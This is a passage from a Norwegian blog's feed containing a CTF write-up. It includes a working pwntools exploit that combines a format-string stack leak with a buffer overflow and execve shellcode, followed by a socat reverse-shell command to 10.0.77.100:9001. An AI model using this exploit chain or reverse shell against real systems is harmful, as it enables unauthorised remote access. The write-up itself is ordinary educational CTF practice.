+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 0x55d932f4f0e7	&lt;span class=&quot;c&quot;&gt;# crash for string&lt;/span&gt;
+2. 0xffffffff		&lt;span class=&quot;c&quot;&gt;# always ffffffff&lt;/span&gt;
+3. 0			&lt;span class=&quot;c&quot;&gt;# always 0&lt;/span&gt;
+4. 0x7ffc56f968d8	&lt;span class=&quot;c&quot;&gt;# empty string&lt;/span&gt;
+5. 0			&lt;span class=&quot;c&quot;&gt;# always 0&lt;/span&gt;
+6. 0x7ffc56f96b20	&lt;span class=&quot;c&quot;&gt;# Pointer to MY string! this is where we will drop our exploit&lt;/span&gt;
+7. 0x55d932f4eaf6	&lt;span class=&quot;c&quot;&gt;# &quot;xeb\x11H\x8d=Q\x07&quot; ??&lt;/span&gt;
+8. 0x70252c70252c7025	&lt;span class=&quot;c&quot;&gt;# Start of string&lt;/span&gt;
+9. 0x252c70252c70252c	&lt;span class=&quot;c&quot;&gt;# string continues&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So, by using a leaked stack address from the printf vulnerable code, and the constructing a buffer overflow payload, I was able to the a full blown shell on the server!
+Mind you, I used better parts of 3-5 days reading, trying something, reading some more, trying some more, before I understood what I had to to,
+not least actually implement it.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Connect to server
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cloud-c2-70'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# read until prompt
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;drop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Get the pointer to the start of the buffer, stored in leaked_start
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;probe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p,'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; \
+        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p,'&lt;/span&gt; \
+        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p,'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; \
+        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;probe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;leaked_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Got pointer to start of buffer.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# ok now we overflow the buffer
+# instead of using a regular padding, we spray the heap with our pointer. we need at least 17 to overflow.
+# start with a complete buffer of 400, filled with NOP
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;numberOfPtr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
+      &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
+      &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
+      &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x58\x0f\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;nopSledSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;numberOfPtr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leaked_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;numberOfPtr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nopSledSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numberOfPtr&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;send_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nopSledSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Sending buffer overflow'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# at this point, we now have a shell.
+# Instead of doing interactive(), we fire up a reverse shell.
+# the lootd daemon is started with socat, so we can use socat to get a descent
+# reverse shell. do remember to start the reverse shell listener.
+# socat file:`tty`,raw,echo=0 tcp-listen:9001
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;drop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Got shell access, spawning reverse shell'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'socat exec:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ash -li&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;,pty,stderr,setsid,sigint,sane tcp:10.0.77.100:9001'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Interesting enough, by using the command download with parameter lootd we get a hexdump of the actual binary file.
+I figured out this after I had exploited. I could have used ghidra to reverse the binary and find the vulnerabilities
+without doing the insane amounts of guesswork I did.
+Anyway, here is the code to extract the binary from the hexdump to be able to analyse it in ghidra.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'lootd.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'big'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'lootd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'wb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Og her faller writeupen fra hverandre, iom at notatene mine var på en VM som i etterkant har blitt slettet.😪
+Jeg hamret iallefall videre og klarte til slutt å komme igjennom hele, en rimelig bratt læringskurve.
+Flere gode writeups for veien videre, e.g.
+&lt;a href=&quot;https://www.indregard.no/2020/03/e-tjenestens-ctf/&quot;&gt;Sigve Indregard&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;til-slutt&quot;&gt;Til slutt&lt;/h2&gt;
+&lt;p&gt;🙌🙌 Takk for at du tok deg tid til å lese alt, trykk på recommend og legg inn en kommentar! 🙌🙌&lt;/p&gt;</content><author><name>Fjank</name></author><summary type="html">Etjenesten CTF: Vi søker deg som vil bidra i cyberoperasjoner mot trusler i utlandet Etjenesten CTF: Vi søker deg som vil bidra i cyberoperasjoner mot trusler i utlandet Introduksjon Introduksjon Etteretningstjenesten har en åpen vurdering av aktuelle sikkerhetsutfordringer for Norge, som ble publisert i Fokus 2020. Fokus er Etterretningstjenestens åpne vurdering av aktuelle sikkerhetsutfordringer for Norge På side 78 av denne var det et hint til en CTF konkurranse, og denne ble også reklamert for. Ved å gå til https://ctf.cybertalent.no/ så kunne man registrere seg og etterhvert delta på konkurransen. Jeg endte opp på en finfin 21. plass til slutt og lærte mye på veien. Konkurransen forgikk ved å bruke SSH for å komme seg inn på konkurranseserveren, hvor man kunne finne noen dokumenter, litt historie, og de faktiske oppgavene. Oppgavene var delt opp i Grunnleggende, Hjernetrim og Oppdrag. La oss hoppe i det!</summary></entry><entry><title type="html">NPST utlyser en midlertidig stilling som snikende alvebetjent</title><link href="https://fjank.no/blog/2020-01-04-pst-chistmas-ctf/" rel="alternate" type="text/html" title="NPST utlyser en midlertidig stilling som snikende alvebetjent" /><published>2020-01-04T00:00:00+01:00</published><updated>2020-01-04T00:00:00+01:00</updated><id>https://fjank.no/blog/pst-chistmas-ctf</id><content type="html" xml:base="https://fjank.no/blog/2020-01-04-pst-chistmas-ctf/">&lt;ul id=&quot;markdown-toc&quot;&gt;
   &lt;li&gt;&lt;a href=&quot;#introduksjon&quot; id=&quot;markdown-toc-introduksjon&quot;&gt;Introduksjon&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#luke-1&quot; id=&quot;markdown-toc-luke-1&quot;&gt;Luke 1&lt;/a&gt;    &lt;ul&gt;
       &lt;li&gt;&lt;a href=&quot;#velkommen-til-npst-10&quot; id=&quot;markdown-toc-velkommen-til-npst-10&quot;&gt;Velkommen til NPST (10)&lt;/a&gt;&lt;/li&gt;
